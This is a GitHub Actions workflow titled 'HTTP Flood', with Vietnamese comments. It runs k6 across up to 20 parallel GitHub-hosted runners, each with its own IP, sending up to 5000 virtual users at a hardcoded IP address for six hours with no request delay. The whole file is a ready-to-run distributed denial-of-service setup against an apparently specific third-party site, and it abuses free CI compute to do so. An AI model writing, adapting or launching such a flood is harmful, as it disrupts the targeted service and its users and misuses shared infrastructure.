name: HTTP Flood — thanhhuyreal

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Target URL'
        required: false
        default: 'http://103.211.206.175/'
      runners:
        description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
        required: true
        default: '1'
      max_vus:
        description: 'Max VUs moi runner'
        required: false
        default: '5000'
      stages:
        description: 'Stages (de trong dung mac dinh)'
        required: false
        default: ''

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          COUNT=${{ github.event.inputs.runners }}
          MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  flood:
    needs: prepare
    name: "Runner ${{ matrix.runner }}"
    runs-on: ubuntu-latest
    # GitHub-hosted runner toi da 6h (360 phut)
    timeout-minutes: 360
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        runner: ${{ fromJson(needs.prepare.outputs.matrix) }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup k6 (native)
        uses: grafana/setup-k6-action@v1

      - name: Tang ulimit
        run: |
          # GitHub runner co the khong cho tang - dung || true de skip
          ulimit -n 131072 || true
          echo "ulimit hien tai: $(ulimit -n)"

      - name: Runner info
        run: |
          echo "Runner : ${{ matrix.runner }}"
          echo "IP     : $(curl -sf https://api.ipify.org || echo unknown)"
          echo "CPU    : $(nproc) cores"
          echo "RAM    : $(free -m | awk '/Mem:/{print $4}') MB free"

      - name: Run k6
        env:
          TARGET_URL:       ${{ github.event.inputs.target_url || 'http://103.211.206.175/' }}
          # 30s ramp len 500, 60s len 5000, giu mai (6h = thoi gian toi da cua runner)
          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:5000,360m:5000' }}
          START_RATE:       "200"
          PRE_VUS:          "500"
          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
          REQUEST_TIMEOUT:  "15s"
          REQUEST_DELAY:    "0"
          MAX_5XX_RATE:     "0.5"
          MAX_TIMEOUT_RATE: "0.8"
        run: |
          ulimit -n 131072
          k6 run --no-usage-report sites/thanhhuyreal/test-script.js
